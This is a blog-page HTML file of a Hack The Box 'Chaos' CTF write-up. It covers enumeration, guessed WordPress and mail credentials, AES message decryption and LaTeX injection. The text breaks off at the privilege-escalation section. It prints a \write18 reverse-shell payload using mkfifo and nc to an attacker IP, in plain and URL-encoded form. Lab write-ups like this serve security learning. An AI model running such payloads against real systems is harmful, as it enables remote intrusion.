@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Chaos | 0xRick Owned Root !</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="Hack The Box - Chaos" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Quick Summary Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as www-data we will exploit a web application that used LaTeX. After that we will escalate privileges to another user and escape rbash. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is 10.10.10.120, I added it to /etc/hosts as chaos.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC chaos.htb We got some ports. http on port 80 and 10000, email related services (imap, pop3) running on ports 110, 143, 993 and 995. Let’s check http. HTTP Initial Enumeration Port 10000 gave me this error : So I switched to https and got a login form : We don’t have any credentials and I ran gobuster and got nothing interesting so we will ignore this and look at port 80. It’s just a normal website, rest of it : I checked that contact form and it’s doing nothing. I ran gobuster on chaos.htb and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://chaos.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:36:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /server-status (Status: 403) /source (Status: 301) ===================================================== 2019/05/24 14:40:36 Finished ===================================================== And now this part is tricky. Because going to the ip of the box 10.10.10.120 instead of chaos.htb will give us a different thing (virtual hosting). It’s saying Direct IP not allowed. I ran another gobuster scan on the ip and got different results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.120/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:41:52 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /wp (Status: 301) ===================================================== 2019/05/24 14:45:37 Finished ===================================================== On chaos.htb the thing the caught my attention was /source so I checked that and it didn’t have anything : I checked http://10.10.10.120/wp and found a wordpress website : I looked at the posts, there was only one post and it was password protected : I clicked on the post link and saw that the author of the post is called human : Before trying to bruteforce the password I tried some basic stuff first and the username:username type of credentials worked. The password was human : And we got some credentials for mail : ayush:jiujitsu Accessing the e-mail Service, Decrypting Secret Message We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used claws-mail (can be installed with apt) and configured it like this : Inbox was empty but drafts had something : ``` From: ayush ayush@localhost To: undisclosed-recipients:; Subject: service Date: Sun, 28 Oct 2018 17:46:38 +0530 User-Agent: Roundcube Webmail/1.3.8" />
+<meta property="og:description" content="Quick Summary Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as www-data we will exploit a web application that used LaTeX. After that we will escalate privileges to another user and escape rbash. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is 10.10.10.120, I added it to /etc/hosts as chaos.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC chaos.htb We got some ports. http on port 80 and 10000, email related services (imap, pop3) running on ports 110, 143, 993 and 995. Let’s check http. HTTP Initial Enumeration Port 10000 gave me this error : So I switched to https and got a login form : We don’t have any credentials and I ran gobuster and got nothing interesting so we will ignore this and look at port 80. It’s just a normal website, rest of it : I checked that contact form and it’s doing nothing. I ran gobuster on chaos.htb and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://chaos.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:36:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /server-status (Status: 403) /source (Status: 301) ===================================================== 2019/05/24 14:40:36 Finished ===================================================== And now this part is tricky. Because going to the ip of the box 10.10.10.120 instead of chaos.htb will give us a different thing (virtual hosting). It’s saying Direct IP not allowed. I ran another gobuster scan on the ip and got different results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.120/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:41:52 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /wp (Status: 301) ===================================================== 2019/05/24 14:45:37 Finished ===================================================== On chaos.htb the thing the caught my attention was /source so I checked that and it didn’t have anything : I checked http://10.10.10.120/wp and found a wordpress website : I looked at the posts, there was only one post and it was password protected : I clicked on the post link and saw that the author of the post is called human : Before trying to bruteforce the password I tried some basic stuff first and the username:username type of credentials worked. The password was human : And we got some credentials for mail : ayush:jiujitsu Accessing the e-mail Service, Decrypting Secret Message We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used claws-mail (can be installed with apt) and configured it like this : Inbox was empty but drafts had something : ``` From: ayush ayush@localhost To: undisclosed-recipients:; Subject: service Date: Sun, 28 Oct 2018 17:46:38 +0530 User-Agent: Roundcube Webmail/1.3.8" />
+<link rel="canonical" href="http://localhost:4000/hack-the-box/chaos/" />
+<meta property="og:url" content="http://localhost:4000/hack-the-box/chaos/" />
+<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:image" content="http://localhost:4000/hackthebox/chaos/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-05-25T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hack The Box - Chaos","dateModified":"2019-05-25T00:00:00+02:00","url":"http://localhost:4000/hack-the-box/chaos/","datePublished":"2019-05-25T00:00:00+02:00","image":"http://localhost:4000/hackthebox/chaos/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/chaos/"},"description":"Quick Summary Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as www-data we will exploit a web application that used LaTeX. After that we will escalate privileges to another user and escape rbash. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is 10.10.10.120, I added it to /etc/hosts as chaos.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC chaos.htb We got some ports. http on port 80 and 10000, email related services (imap, pop3) running on ports 110, 143, 993 and 995. Let’s check http. HTTP Initial Enumeration Port 10000 gave me this error : So I switched to https and got a login form : We don’t have any credentials and I ran gobuster and got nothing interesting so we will ignore this and look at port 80. It’s just a normal website, rest of it : I checked that contact form and it’s doing nothing. I ran gobuster on chaos.htb and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://chaos.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:36:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /server-status (Status: 403) /source (Status: 301) ===================================================== 2019/05/24 14:40:36 Finished ===================================================== And now this part is tricky. Because going to the ip of the box 10.10.10.120 instead of chaos.htb will give us a different thing (virtual hosting). It’s saying Direct IP not allowed. I ran another gobuster scan on the ip and got different results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.120/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:41:52 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /wp (Status: 301) ===================================================== 2019/05/24 14:45:37 Finished ===================================================== On chaos.htb the thing the caught my attention was /source so I checked that and it didn’t have anything : I checked http://10.10.10.120/wp and found a wordpress website : I looked at the posts, there was only one post and it was password protected : I clicked on the post link and saw that the author of the post is called human : Before trying to bruteforce the password I tried some basic stuff first and the username:username type of credentials worked. The password was human : And we got some credentials for mail : ayush:jiujitsu Accessing the e-mail Service, Decrypting Secret Message We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used claws-mail (can be installed with apt) and configured it like this : Inbox was empty but drafts had something : ``` From: ayush ayush@localhost To: undisclosed-recipients:; Subject: service Date: Sun, 28 Oct 2018 17:46:38 +0530 User-Agent: Roundcube Webmail/1.3.8","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/tagbuttons.css">
+  <link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Chaos</h1>
+    <p class="post-meta">
+      <h7>
+        Tags: 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Linux/';">Linux</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/rbash/';">rbash</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/LaTeX injection/';">LaTeX injection</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Wordpress/';">Wordpress</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Cryptography/';">Cryptography</button> 
+        
+      </h7>
+      <br>
+      <time class="dt-published" datetime="2019-05-25T00:00:00+02:00" itemprop="datePublished">May 25, 2019
+      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <hr />
+
+<h3 id="quick-summary">Quick Summary</h3>
+<h4 id="hey-guys-today-chaos-retired-and-heres-my-write-up-about-it-chaos-was-a-ctf-style-machine-i-cant-say-that-it-simulated-a-real-life-situation-i-had-fun-solving-this-box-some-steps-were-straightforward-others-were-very-tricky-about-main-steps-to-get-an-initial-shell-as-www-data-we-will-exploit-a-web-application-that-used-latex-after-that-we-will-escalate-privileges-to-another-user-and-escape-rbash-for-root-privilege-escalation-we-will-extract-root-credentials-from-a-firefox-profile-and-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010120-i-added-it-to-etchosts-as-chaoshtb-lets-jump-right-in">Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as <code class="highlighter-rouge">www-data</code> we will exploit a web application that used <a href="https://en.wikipedia.org/wiki/LaTeX"><code class="highlighter-rouge">LaTeX</code></a>. After that we will escalate privileges to another user and escape <code class="highlighter-rouge">rbash</code>. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.120</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">chaos.htb</code>. Let’s jump right in.</h4>
+<p><img src="/images/hackthebox/chaos/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -sC chaos.htb</code>
+<img src="/images/hackthebox/chaos/1.png" alt="" /></p>
+<h4 id="we-got-some-ports-http-on-port-80-and-10000-email-related-services-imap-pop3-running-on-ports-110-143-993-and-995-lets-check-http">We got some ports. <code class="highlighter-rouge">http</code> on port 80 and 10000, email related services (<code class="highlighter-rouge">imap</code>, <code class="highlighter-rouge">pop3</code>) running on ports 110, 143, 993 and 995. Let’s check <code class="highlighter-rouge">http</code>.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="http-initial-enumeration">HTTP Initial Enumeration</h3>
+<h4 id="port-10000-gave-me-this-error-">Port 10000 gave me this error :</h4>
+<p><img src="/images/hackthebox/chaos/2.png" alt="" /></p>
+<h4 id="so-i-switched-to-https-and-got-a-login-form-">So I switched to <code class="highlighter-rouge">https</code> and got a login form :</h4>
+<p><img src="/images/hackthebox/chaos/3.png" alt="" /></p>
+<h4 id="we-dont-have-any-credentials-and-i-ran-gobuster-and-got-nothing-interesting-so-we-will-ignore-this-and-look-at-port-80">We don’t have any credentials and I ran <code class="highlighter-rouge">gobuster</code> and got nothing interesting so we will ignore this and look at port 80.</h4>
+<p><img src="/images/hackthebox/chaos/4.png" alt="" /></p>
+<h4 id="its-just-a-normal-website-rest-of-it-">It’s just a normal website, rest of it :</h4>
+<p><img src="/images/hackthebox/chaos/5.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/chaos/6.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/chaos/7.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/chaos/8.png" alt="" /></p>
+<h4 id="i-checked-that-contact-form-and-its-doing-nothing-i-ran-gobuster-on-chaoshtb-and-got-these-results-">I checked that contact form and it’s doing nothing. I ran <code class="highlighter-rouge">gobuster</code> on <code class="highlighter-rouge">chaos.htb</code> and got these results :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://chaos.htb/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/05/24 14:36:56 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/css (Status: 301)
+/img (Status: 301)
+/index.html (Status: 200)
+/javascript (Status: 301)
+/js (Status: 301)
+/server-status (Status: 403)
+/source (Status: 301)
+=====================================================
+2019/05/24 14:40:36 Finished
+=====================================================
+</code></pre></div></div>
+<h4 id="and-now-this-part-is-tricky-because-going-to-the-ip-of-the-box-101010120-instead-of-chaoshtb-will-give-us-a-different-thing-virtual-hosting">And now this part is tricky. Because going to the ip of the box <code class="highlighter-rouge">10.10.10.120</code> instead of <code class="highlighter-rouge">chaos.htb</code> will give us a different thing (virtual hosting).</h4>
+<p><img src="/images/hackthebox/chaos/9.png" alt="" /></p>
+<h4 id="its-saying-direct-ip-not-allowed-i-ran-another-gobuster-scan-on-the-ip-and-got-different-results-">It’s saying <code class="highlighter-rouge">Direct IP not allowed</code>. I ran another <code class="highlighter-rouge">gobuster</code> scan on the ip and got different results :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.120/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/05/24 14:41:52 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+/javascript (Status: 301)
+/server-status (Status: 403)
+/wp (Status: 301)
+=====================================================
+2019/05/24 14:45:37 Finished
+=====================================================
+</code></pre></div></div>
+<h4 id="on-chaoshtb-the-thing-the-caught-my-attention-was-source-so-i-checked-that-and-it-didnt-have-anything-">On <code class="highlighter-rouge">chaos.htb</code> the thing the caught my attention was <code class="highlighter-rouge">/source</code> so I checked that and it didn’t have anything :</h4>
+<p><img src="/images/hackthebox/chaos/10.png" alt="" /></p>
+<h4 id="i-checked-http101010120wp-and-found-a-wordpress-website-">I checked <code class="highlighter-rouge">http://10.10.10.120/wp</code> and found a <code class="highlighter-rouge">wordpress</code> website :</h4>
+<p><img src="/images/hackthebox/chaos/11.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/chaos/12.png" alt="" /></p>
+<h4 id="i-looked-at-the-posts-there-was-only-one-post-and-it-was-password-protected-">I looked at the posts, there was only one post and it was password protected :</h4>
+<p><img src="/images/hackthebox/chaos/13.png" alt="" /></p>
+<h4 id="i-clicked-on-the-post-link-and-saw-that-the-author-of-the-post-is-called-human-">I clicked on the post link and saw that the author of the post is called <code class="highlighter-rouge">human</code> :</h4>
+<p><img src="/images/hackthebox/chaos/14.png" alt="" /></p>
+<h4 id="before-trying-to-bruteforce-the-password-i-tried-some-basic-stuff-first-and-the-usernameusername-type-of-credentials-worked-the-password-was-human-">Before trying to bruteforce the password I tried some basic stuff first and the <code class="highlighter-rouge">username:username</code> type of credentials worked. The password was <code class="highlighter-rouge">human</code> :</h4>
+<p><img src="/images/hackthebox/chaos/15.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/chaos/16.png" alt="" /></p>
+<h4 id="and-we-got-some-credentials-for-mail--ayushjiujitsu">And we got some credentials for mail : <code class="highlighter-rouge">ayush:jiujitsu</code></h4>
+<p><br /></p>
+<hr />
+
+<h3 id="accessing-the-e-mail-service-decrypting-secret-message">Accessing the e-mail Service, Decrypting Secret Message</h3>
+<h4 id="we-saw-earlier-some-email-services-running-on-the-machine-now-we-have-credentials-to-access-these-services-to-do-that-we-will-use-an-email-client-i-used-claws-mail-can-be-installed-with-apt-and-configured-it-like-this-">We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used <code class="highlighter-rouge">claws-mail</code> (can be installed with apt) and configured it like this :</h4>
+<p><img src="/images/hackthebox/chaos/17.png" alt="" /></p>
+<h4 id="inbox-was-empty-but-drafts-had-something-">Inbox was empty but drafts had something :</h4>
+<p><img src="/images/hackthebox/chaos/18.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From: ayush &lt;ayush@localhost&gt;
+To: undisclosed-recipients:;
+Subject: service
+Date: Sun, 28 Oct 2018 17:46:38 +0530
+User-Agent: Roundcube Webmail/1.3.8
+
+Hii, sahay
+Check the enmsg.txt
+You are the password XD.
+Also attached the script which i used to encrypt.
+Thanks,
+Ayush
+</code></pre></div></div>
+<h4 id="after-the-message-he-attached-two-files--enim_msgtxt-and-enpy-he-said-you-are-the-password-so-first-guess--password-most-likely-will-be-sahay">After the message he attached two files : <code class="highlighter-rouge">enim_msg.txt</code> and <code class="highlighter-rouge">en.py</code>. He said <code class="highlighter-rouge">you are the password</code>, so first guess … password most likely will be <code class="highlighter-rouge">sahay</code>.</h4>
+<h4 id="enim_msgtxt-is-the-encrypted-message-"><code class="highlighter-rouge">enim_msg.txt</code> is the encrypted message :</h4>
+<p><img src="/images/hackthebox/chaos/19.png" alt="" /></p>
+<h4 id="and-enpy-is-the-script-used-to-encrypt-the-message-">And <code class="highlighter-rouge">en.py</code> is the script used to encrypt the message :</h4>
+<p><img src="/images/hackthebox/chaos/20.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def encrypt(key, filename):
+    chunksize = 64*1024
+    outputFile = "en" + filename
+    filesize = str(os.path.getsize(filename)).zfill(16)
+    IV =Random.new().read(16)
+
+    encryptor = AES.new(key, AES.MODE_CBC, IV)
+
+    with open(filename, 'rb') as infile:
+        with open(outputFile, 'wb') as outfile:
+            outfile.write(filesize.encode('utf-8'))
+            outfile.write(IV)
+
+            while True:
+                chunk = infile.read(chunksize)
+
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += b' ' * (16 - (len(chunk) % 16))
+
+                outfile.write(encryptor.encrypt(chunk))
+
+def getKey(password):
+            hasher = SHA256.new(password.encode('utf-8'))
+            return hasher.digest()
+</code></pre></div></div>
+<h4 id="by-looking-at-the-encryption-script-we-will-know-that-the-message-is--aes-encrypted-i-used-this-tool-to-decrypt-the-message-">By looking at the encryption script we will know that the message is  AES encrypted. I used this <a href="https://github.com/happygirlzt/Cryptography/blob/master/encrypt.py">tool</a> to decrypt the message :</h4>
+<p><img src="/images/hackthebox/chaos/21.png" alt="" /></p>
+<h4 id="password-sahay-worked-the-decrypted-message-was-saved-in-a-file-called-t-it-was-base64-encoded-so-i-had-to-decode-it-">Password <code class="highlighter-rouge">sahay</code> worked. The decrypted message was saved in a file called <code class="highlighter-rouge">t</code>. It was base64 encoded so I had to decode it :</h4>
+<p><img src="/images/hackthebox/chaos/22.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hii Sahay
+
+Please check our new service which create pdf
+
+p.s - As you told me to encrypt important msg, i did :)
+
+http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+
+Thanks,
+Ayush
+
+</code></pre></div></div>
+<h4 id="we-got-a-link--httpchaoshtbj00_w1ll_f1nd_n07h1n9_h3r3-lets-check-that">We got a link : <code class="highlighter-rouge">http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3</code>, Let’s check that.</h4>
+<hr />
+
+<h3 id="exploiting-latex-reverse-shell-as-www-data">Exploiting <code class="highlighter-rouge">LaTeX</code>, Reverse Shell as <code class="highlighter-rouge">www-data</code></h3>
+<p><img src="/images/hackthebox/chaos/23.png" alt="" /></p>
+<h4 id="its-a-web-application-that-creates-pdfs-theres-a-field-for-input-and-3-templates-to-choose-from-test1-test2-test3-before-trying-to-create-a-pdf-i-ran-gobuster-and-got-these-results-">It’s a web application that creates pdfs, There’s a field for input and 3 templates to choose from (<code class="highlighter-rouge">test1</code>, <code class="highlighter-rouge">test2</code>, <code class="highlighter-rouge">test3</code>) before trying to create a pdf I ran <code class="highlighter-rouge">gobuster</code> and got these results :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/05/24 16:38:15 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/assets (Status: 301)
+/doc (Status: 301)
+/index.php (Status: 200)
+/pdf (Status: 301)
+/source (Status: 301)
+/templates (Status: 301)
+=====================================================
+2019/05/24 16:39:53 Finished
+=====================================================
+</code></pre></div></div>
+<h4 id="doc-"><code class="highlighter-rouge">/doc</code> :</h4>
+<p><img src="/images/hackthebox/chaos/24.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/chaos/25.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/chaos/26.png" alt="" /></p>
+<h4 id="nothing-important-just-some-documentation-pdfs-there-was-a-directory-called-latex-this-reveals-that-the-web-app-is-using-latex">Nothing important, just some documentation pdfs. There was a directory called <code class="highlighter-rouge">latex</code>, this reveals that the web app is using <code class="highlighter-rouge">LaTeX</code>.</h4>
+<h4 id="pdf-"><code class="highlighter-rouge">/pdf</code> :</h4>
+<p><img src="/images/hackthebox/chaos/27.png" alt="" /></p>
+<h4 id="this-is-where-the-created-pdfs-are-saved-i-looked-at-some-of-them-and-they-were-just-tests-like-this-one-for-example-">This is where the created pdfs are saved, I looked at some of them and they were just tests. Like this one for example :</h4>
+<p><img src="/images/hackthebox/chaos/28.png" alt="" /></p>
+<h4 id="i-tried-to-create-a-pdf-and-intercepted-the-request-with-burp-">I tried to create a pdf and intercepted the request with burp :</h4>
+<p><img src="/images/hackthebox/chaos/29.png" alt="" /></p>
+<h4 id="the-response-showed-a-full-log-which-revealed-type-and-version-of-the-backend-software-used-to-create-the-pdfs">The response showed a full log which revealed type and version of the backend software used to create the pdfs.</h4>
+<p><img src="/images/hackthebox/chaos/30.png" alt="" /></p>
+<h4 id="however-the-first-template-failed-">However the first template failed :</h4>
+<p><img src="/images/hackthebox/chaos/31.png" alt="" /></p>
+<h4 id="test2-worked-fine-"><code class="highlighter-rouge">test2</code> worked fine :</h4>
+<p><img src="/images/hackthebox/chaos/32.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/chaos/33.png" alt="" /></p>
+<h4 id="test3-as-well-latex-can-be-injectable-and-can-cause-some-vulnerabilities-if-there-wasnt-a-good-filter-i-tried-some-payloads-from-payloads-all-the-things-and-most-of-them-got-filtered-but-this-injection-payload-worked--immediatewrite18command-so-i-got-a-reverse-shell-like-this-"><code class="highlighter-rouge">test3</code> as well. <code class="highlighter-rouge">LaTeX</code> can be injectable and can cause some vulnerabilities if there wasn’t a good filter. I tried some payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">Payloads All The Things</a> and most of them got filtered. But this injection payload worked : <code class="highlighter-rouge">\immediate\write18{command}</code>. So I got a reverse shell like this :</h4>
+<p><img src="/images/hackthebox/chaos/34.png" alt="" /></p>
+<h4 id="payload--immediatewrite18rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-1010xxxx-1337-tmpf">Payload : <code class="highlighter-rouge">\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f}</code></h4>
+<h4 id="url-encoded--immediatewrite18rmtmpf3bmkfifotmpf3bcattmpfbinsh-i2261nc1010xxxx1337tmpf">Url Encoded : <code class="highlighter-rouge">\immediate\write18{rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.xx.xx+1337+&gt;/tmp/f}</code></h4>
+<p><img src="/images/hackthebox/chaos/35.png" alt="" /></p>
+<h4 id="we-got-a-reverse-shell-as-www-data-there-are-two-users-on-the-box--sahay-and-ayush-we-need-to-be-one-of-them-">We got a reverse shell as <code class="highlighter-rouge">www-data</code>, There are two users on the box : <code class="highlighter-rouge">sahay</code> and <code class="highlighter-rouge">ayush</code>. We need to be one of them :</h4>
+<p><img src="/images/hackthebox/chaos/36.png" alt="" /></p>
+<hr />
+
+<h3 id="privilege-escalation-to-ayush-bypassing-rbash-user-flag">Privilege Escalation to <code class="highlighter-rouge">ayush</code>, Bypassing <code class="highlighter-rouge">rbash</code>, User Flag</h3>
